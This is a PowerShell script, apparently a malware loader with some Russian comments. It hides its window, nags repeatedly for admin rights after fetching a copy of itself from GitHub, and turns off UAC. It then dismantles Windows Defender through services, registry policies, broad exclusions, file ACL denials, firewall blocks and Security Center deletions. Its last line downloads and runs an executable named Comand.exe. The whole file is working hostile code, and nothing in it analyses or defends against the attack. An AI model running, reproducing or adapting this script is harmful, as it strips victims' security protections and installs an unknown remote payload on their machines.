# ===== HIDE WINDOW =====
try {
    Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
    $w = [C.W]::GetConsoleWindow()
    if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
} catch {}

# ===== ADMIN CHECK + ELEVATION =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $tmp = Join-Path $env:TEMP "_svc.ps1"
    (iwr "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -UseBasicParsing).Content | Out-File $tmp -Encoding UTF8 -Force
    while ($true) {
        $p = Start-Process powershell -Verb RunAs -PassThru -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
        if ($p -ne $null) { [Environment]::Exit(0) }
        Start-Sleep -Seconds 2
    }
}

$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

#Requires -RunAsAdministrator
# ===== УДАЛЕНИЕ ЗАПИСЕЙ ОБ АНТИВИРУСАХ ИЗ WSC =====
#Requires -RunAsAdministrator

# ===== TAMPER PROTECTION =====
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtectionSource" -Value 2 -Type DWord -Force

# ===== STOP SERVICES =====
sc.exe stop WinDefend
sc.exe stop WdFilter
sc.exe stop WdNisDrv
sc.exe stop WdNisSvc
sc.exe stop SecurityHealthService

# ===== DISABLE SERVICES =====
sc.exe config WinDefend start= disabled
sc.exe config WdFilter start= disabled
sc.exe config WdNisDrv start= disabled
sc.exe config WdNisSvc start= disabled
sc.exe config SecurityHealthService start= disabled

# ===== POLICIES — CORE =====
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableIOAVProtection" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableIntrusionPreventionSystem" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableScriptScanning" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "SubmitSamplesConsent" -Value 2 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "AllowFastServiceStartup" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpywareOnMsProd" -Value 1 -Type DWord -Force

# ===== POLICIES — REAL-TIME PROTECTION =====
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force

# ===== POLICIES — SPYNET / CLOUD =====
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 2 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -Type DWord -Force

# ===== MPENGINE — CLOUD BLOCK =====
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\MpEngine" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\MpEngine" -Name "MpCloudBlockLevel" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\MpEngine" -Name "MpMeteringPolicy" -Value 0 -Type DWord -Force

# ===== REPORTING / TELEMETRY =====
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" -Name "DisableGenericRePorts" -Value 1 -Type DWord -Force

# ===== SCAN =====
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" -Name "DisableQuickScan" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force

# ===== EXCLUSIONS (temp folder) =====
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension "exe" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension "dll" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension "ps1" -ErrorAction SilentlyContinue

# ===== BLOCK MpCmdRun.exe =====
$mpCmdRun = "$env:ProgramFiles\Windows Defender\MpCmdRun.exe"
if (Test-Path $mpCmdRun) {
    takeown /F $mpCmdRun
    icacls $mpCmdRun /deny "Everyone:(X)"
}

# ===== BLOCK MSASCuiL.exe =====
$msascuil = "$env:ProgramFiles\Windows Defender\MSASCuiL.exe"
if (Test-Path $msascuil) {
    takeown /F $msascuil
    icacls $msascuil /deny "Everyone:(X)"
}

# ===== BLOCK MsMpEng.exe =====
$msmpeng = "$env:ProgramFiles\Windows Defender\MsMpEng.exe"
if (Test-Path $msmpeng) {
    takeown /F $msmpeng
    icacls $msmpeng /deny "Everyone:(X)"
}

# ===== DISABLE SCHEDULED TASKS =====
schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable

# ===== SECURITY CENTER — DISABLE NOTIFICATIONS =====
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center" -Force | Out-Null
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray" -Name "DisableSystray" -Value 1 -Type DWord -Force
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Type DWord -Force

# ===== DISABLE WINDOWS SECURITY APP =====
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center" -Name "DisableNotificationCenter" -Value 1 -Type DWord -Force

# ===== TASK KILL =====
taskkill /F /IM MsMpEng.exe
taskkill /F /IM MpCmdRun.exe

# ===== FIREWALL BLOCK =====
New-NetFirewallRule -DisplayName "Block MsMpEng" -Direction Outbound -Program "$env:ProgramFiles\Windows Defender\MsMpEng.exe" -Action Block -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "Block MpCmdRun" -Direction Outbound -Program "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -Action Block -ErrorAction SilentlyContinue

# ===== ADDITIONAL REGISTRY — DISABLE DEFENDER UI =====
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "SecurityHealth" -Value ([byte[]](03,00,00,00,00,00,00,00,00,00,00,00)) -Type Binary -Force

# ===== SERVICES — REGISTRY START TYPE =====
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Value 4 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter" -Name "Start" -Value 4 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisDrv" -Name "Start" -Value 4 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisSvc" -Name "Start" -Value 4 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Name "Start" -Value 4 -Type DWord -Force

# 1. Удаляем весь раздел с провайдерами Av (основной путь)
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av" -Recurse -Force -ErrorAction SilentlyContinue

# 2. Удаляем Monitoring-записи (если есть)
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Monitoring" -Recurse -Force -ErrorAction SilentlyContinue

reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance" /v Altitude /f


#Requires -RunAsAdministrator

# ===== 1. TAMPER PROTECTION OFF =====
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -Force

# ===== 2. START SERVICE BEFORE Set-MpPreference =====
$svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
if ($svc -and $svc.Status -ne "Running") {
    Start-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
}

# ===== 3. REGISTRY POLICIES (work without service) =====
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force

# ===== 4. Set-MpPreference (service alive) =====
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
try { Set-MpPreference -DisableBehaviorMonitoring $true } catch {}
try { Set-MpPreference -DisableBlockAtFirstSeen $true } catch {}
try { Set-MpPreference -DisableIOAVProtection $true } catch {}
try { Set-MpPreference -DisablePrivacyMode $true } catch {}
try { Set-MpPreference -DisableArchiveScanning $true } catch {}
try { Set-MpPreference -DisableIntrusionPreventionSystem $true } catch {}
try { Set-MpPreference -DisableScriptScanning $true } catch {}
try { Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true } catch {}
try { Set-MpPreference -SubmitSamplesConsent 2 } catch {}
try { Set-MpPreference -MAPSReporting 0 } catch {}
try { Set-MpPreference -HighThreatDefaultAction 6 -Force } catch {}
try { Set-MpPreference -ModerateThreatDefaultAction 6 } catch {}
try { Set-MpPreference -LowThreatDefaultAction 6 } catch {}
try { Set-MpPreference -SevereThreatDefaultAction 6 } catch {}

# ===== 5. WMI EXCLUSION PATHS (like SheetRAT) =====
try {
    $wmi = Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class MSFT_MpPreference
    $paths = @()
    if ($env:TEMP) { $paths += $env:TEMP }
    if ($env:APPDATA) { $paths += $env:APPDATA }
    $paths += "C:\Users"
    $wmi.Add("ExclusionPath", $paths)
} catch {}

# ===== 6. STOP SERVICE AFTER =====
sc.exe stop WinDefend
sc.exe config WinDefend start= disabled


$p="$env:TEMP\Comand.exe"; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile $p; Start-Process $p
